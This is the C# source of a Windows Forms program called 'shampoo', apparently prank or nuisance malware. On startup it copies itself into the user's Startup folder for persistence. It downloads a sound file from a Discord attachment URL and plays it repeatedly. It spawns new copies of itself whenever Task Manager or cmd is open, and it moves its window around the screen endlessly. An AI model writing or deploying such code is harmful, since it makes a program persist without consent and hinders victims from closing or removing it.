using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Net;
using System.Windows.Forms;

namespace shampoo
{
    public partial class Form1 : Form
    {
        SoundPlayer simpleSound = new SoundPlayer(Path.GetTempPath() + "\\shampoo.wav");
        Process[] pname = Process.GetProcessesByName("taskmgr");

        int x = 1;
        int cycle = 0;

        int tmax = 0;
        int lmax = 0;
        int t = 0;
        int l = 0;

        string screenWidth = Screen.PrimaryScreen.Bounds.Width.ToString();
        string screenHeight = Screen.PrimaryScreen.Bounds.Height.ToString();

        public Form1()
        {
            string source = AppDomain.CurrentDomain.BaseDirectory + "\\shampoo.exe";
            string dest = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shampoo.exe";
            if (File.Exists(dest))
            {

            }
            else
            {
                File.Copy(source, dest, true);
            }

            WebClient webClient = new WebClient();
            Uri shampoos = new Uri("https://cdn.discordapp.com/attachments/966780583600619594/967199545928859699/shampoo.wav", UriKind.Absolute);
            webClient.DownloadFile(shampoos, Path.GetTempPath() + "\\shampoo.wav");
            InitializeComponent();
            this.KeyPreview = true;
            simpleSound.Play();

            timer1 = new Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 2500;
            timer1.Start();

            timer2 = new Timer();
            timer2.Tick += new EventHandler(timer2_Tick);
            timer2.Interval = 250;
            timer2.Start();
        }

        void timer1_Tick(object sender, EventArgs e)
        {
            simpleSound.Play();

            pname = Process.GetProcessesByName("taskmgr");
            if (pname.Length == 0) { }
            else
                Process.Start(AppDomain.CurrentDomain.BaseDirectory + "\\shampoo.exe");

            pname = Process.GetProcessesByName("cmd");
            if (pname.Length == 0) { }
            else
                Process.Start(AppDomain.CurrentDomain.BaseDirectory + "\\shampoo.exe");


        }

        void timer2_Tick(object sender, EventArgs e)
        {
            cycle = cycle + 1;
            Random randt = new Random();
            Random randl = new Random();

            tmax = Convert.ToInt32(screenHeight);
            lmax = Convert.ToInt32(screenWidth);

            int randtt = randt.Next(0, tmax - 300);
            int randll = randl.Next(0, lmax - 400);

            if (cycle == 1)
            {
                t = 1;
                l = 1;
                MessageBox.Show(tmax.ToString() + lmax.ToString()) ;
            }
            do
            {
                if(t < tmax - 75)
                {
                    t = t + 10;
                    this.Top = t;
                }
                if(l < lmax - 75)
                {
                    l = l + 10;
                    this.Left = l;
                }
                if(t > randtt)
                {
                    t = t - 10;
                    this.Top = t;
                }
                if(l > randll)
                {
                    l = l - 10;
                    this.Left = l;
                }
            }
            while (x == 1);
        }
    }
}
